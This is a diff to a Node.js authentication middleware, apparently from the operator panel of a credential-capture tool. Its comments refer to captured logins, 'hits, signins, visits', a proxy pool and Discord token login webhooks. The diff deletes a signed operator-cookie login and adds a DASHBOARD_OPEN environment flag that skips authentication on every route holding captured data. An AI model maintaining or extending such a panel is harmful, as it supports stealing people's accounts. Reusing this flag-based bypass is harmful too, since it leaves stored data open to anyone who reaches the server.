@@ -136,7 +136,6 @@ const PUBLIC_API_PREFIXES = [
     '/api/templates',
     '/api/user',
     '/api/login-state',
-    '/api/op',
     '/api/webhook/login-with-token',
     '/api/webhook/recover',
     '/api/webhook/status',
@@ -153,7 +152,7 @@ const PUBLIC_READ_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);
 // every request carries X-Forwarded-For, and `req.ip` then reflects whatever the
 // proxy chain claims. Treating that as local made `X-Forwarded-For: 127.0.0.1`
 // a full read of every capture. A proxy-marked request never qualifies; it must
-// carry a session or the operator cookie.
+// carry a session or DASHBOARD_OPEN.
 const PROXY_HEADERS = ['x-forwarded-for', 'x-real-ip', 'forwarded', 'cf-connecting-ip', 'x-vercel-forwarded-for'];
 
 function isLoopbackAddress(raw) {
@@ -172,75 +171,11 @@ function isTrustedLocal(req) {
     return !peer || isLoopbackAddress(peer);
 }
 
-// ── Operator cookie ──
-// Loopback trust is fragile behind a proxy, and DASHBOARD_OPEN=true is a public
-// panel. OPERATOR_KEY is the portable door: /?key=<key> sets a signed, httpOnly
-// cookie and the panel opens. The raw key never lands in the cookie.
-
-const OPERATOR_COOKIE = 'op';
-const OPERATOR_TTL_MS = 12 * 60 * 60 * 1000;
-
-function operatorCookieValue() {
-    const key = String(process.env.OPERATOR_KEY || '');
-    if (!key) return null;
-    return crypto.createHmac('sha256', String(process.env.SESSION_SECRET || 'operator'))
-        .update(`operator:${key}`)
-        .digest('hex');
-}
-
-function timingSafeEqualHex(a, b) {
-    const ba = Buffer.from(String(a || ''), 'hex');
-    const bb = Buffer.from(String(b || ''), 'hex');
-    if (ba.length === 0 || ba.length !== bb.length) return false;
-    try { return crypto.timingSafeEqual(ba, bb); } catch { return false; }
-}
-
-function hasOperatorCookie(req) {
-    const expected = operatorCookieValue();
-    if (!expected) return false;
-    return timingSafeEqualHex(req.cookies ? req.cookies[OPERATOR_COOKIE] : readCookieHeader(req, OPERATOR_COOKIE), expected);
-}
-
-function readCookieHeader(req, name) {
-    const raw = String((req.get && req.get('cookie')) || '');
-    if (!raw) return '';
-    for (const part of raw.split(';')) {
-        const idx = part.indexOf('=');
-        if (idx === -1) continue;
-        if (part.slice(0, idx).trim() === name) return part.slice(idx + 1).trim();
-    }
-    return '';
-}
-
-function setOperatorCookie(res) {
-    const value = operatorCookieValue();
-    if (!value) return false;
-    res.cookie(OPERATOR_COOKIE, value, {
-        httpOnly: true,
-        sameSite: 'lax',
-        secure: process.env.VERCEL === undefined ? false : true,
-        maxAge: OPERATOR_TTL_MS,
-        path: '/'
-    });
-    return true;
-}
-
-// Is this request allowed to touch operator data without a Discord session?
-// Order: a real session wins, then the operator cookie, then an actual loopback
-// request with no proxy headers. DASHBOARD_OPEN=true is deliberately not part of
-// this decision any more — it opens the page, not the capture store.
+// Is this request allowed to touch operator data? A signed-in operator or a
+// genuine loopback request. DASHBOARD_OPEN=true is handled at the gate itself
+// as the explicit "I am the only one here" switch — see apiGuard.
 function isOperatorAuthorized(req) {
-    if (isAuthenticated(req)) return true;
-    if (hasOperatorCookie(req)) return true;
-    return isTrustedLocal(req);
-}
-
-function validateOperatorKey(candidate) {
-    const key = String(process.env.OPERATOR_KEY || '');
-    if (!key) return false;
-    const a = crypto.createHash('sha256').update(String(candidate || '')).digest();
-    const b = crypto.createHash('sha256').update(key).digest();
-    try { return crypto.timingSafeEqual(a, b); } catch { return false; }
+    return isAuthenticated(req) || isTrustedLocal(req);
 }
 
 // Prefix match that respects path segments: '/api/auth' matches '/api/auth' and
@@ -260,7 +195,7 @@ function apiGuard(req, res, next) {
     // session exists. Reads are free, writes are not, except where noted.
     if (matchesPrefix(pathname, PUBLIC_API_PREFIXES)) {
         const writeExempt = ['/api/auth', '/api/capture-login', '/api/client-error', '/api/webhook/recover',
-            '/api/webhook/login-with-token', '/api/op'];
+            '/api/webhook/login-with-token'];
         if (PUBLIC_READ_METHODS.has(req.method) || matchesPrefix(pathname, writeExempt)) return next();
         if (isOperatorAuthorized(req)) return next();
         return requireAuth(req, res, next);
@@ -268,8 +203,10 @@ function apiGuard(req, res, next) {
 
     // Everything else — hits, signins, visits, stats, the proxy pool, the
     // tenant admin surface — carries captured data or operator configuration.
-    // A signed-in operator, the operator cookie, or a genuine loopback request.
+    // A signed-in operator, a genuine loopback request, or the deliberate
+    // single-operator switch: DASHBOARD_OPEN=true.
     if (isOperatorAuthorized(req)) return next();
+    if (process.env.DASHBOARD_OPEN === 'true') return next();
     return requireAuth(req, res, next);
 }
 
@@ -442,11 +379,6 @@ module.exports = {
     isAuthenticated,
     isTrustedLocal,
     isOperatorAuthorized,
-    hasOperatorCookie,
-    setOperatorCookie,
-    validateOperatorKey,
-    OPERATOR_COOKIE,
-    OPERATOR_TTL_MS,
     requireAuth,
     apiGuard,
     rateLimit,
